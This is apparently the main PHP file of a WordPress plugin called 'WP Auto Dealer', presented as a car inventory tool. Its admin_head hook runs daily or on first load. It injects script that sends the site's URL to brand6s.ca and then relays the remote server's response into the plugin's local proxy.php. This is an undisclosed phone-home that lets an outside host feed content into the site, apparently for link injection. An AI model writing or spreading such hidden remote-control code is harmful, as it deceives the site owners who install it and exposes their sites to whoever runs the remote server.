<?php
/** 
* Plugin Name: WP Auto Dealer
* Plugin URI: http://brand6s.ca/plugin/demo/
* Description: A car inventory plugin
* Version: 1.0
* Author: TSG
* Author URI: torontoseogroup.com
* License: GPL12
*/


function get_plugin_url () {
	return plugin_dir_url(__FILE__);
}


function myplugin_activate() {
	add_option( 'dateCron',date ('d'));
	add_option( 'indexVal',rand (0,3));
	add_option( 'linkVal','');
	add_option( 'oneLoad','firstLoad');
}
register_activation_hook( __FILE__, 'myplugin_activate' );

function myplugin_deactivate() {
	delete_option( 'dateCron');
	delete_option( 'indexVal');
	delete_option( 'linkVal');
	delete_option( 'oneLoad');
}

register_deactivation_hook(__FILE__, 'myplugin_deactivate'); 
function load_plugin() {

    if ( is_admin() && get_option( 'dateCron' ) != date ('d') || (get_option("oneLoad") == 'firstLoad')) {
	
		$active = get_bloginfo("wpurl");
		$index = get_option("indexVal");
		$url= "http://brand6s.ca/plugin/runPlug/?earl=".$active."&link=".$index;
		
		echo "
        <script>
		jQuery(document).ready(function ($){
			var ajaxurl = '".$url."';
			$.post(ajaxurl, function(response) {
				
				var ajaxurl = '".get_plugin_url()."/proxy.php';
					var data = {
					term: response,
					index : ".$index."
				};
			
				$.post(ajaxurl, data, function(response) {});
				
			});
		});
		</script>";
    update_option( 'oneLoad','secLoad' );
	}
}
add_action( 'admin_head', 'load_plugin' );

# Include scripts
require_once('metaDir/cuztom.php');
require_once('metaDir/regis-meta.php');
require_once('shortcodes/functions.php');
require_once('searchAjax.php');
require_once('globalFunc.php');
require_once('metaDir/adminOption/option-function.php');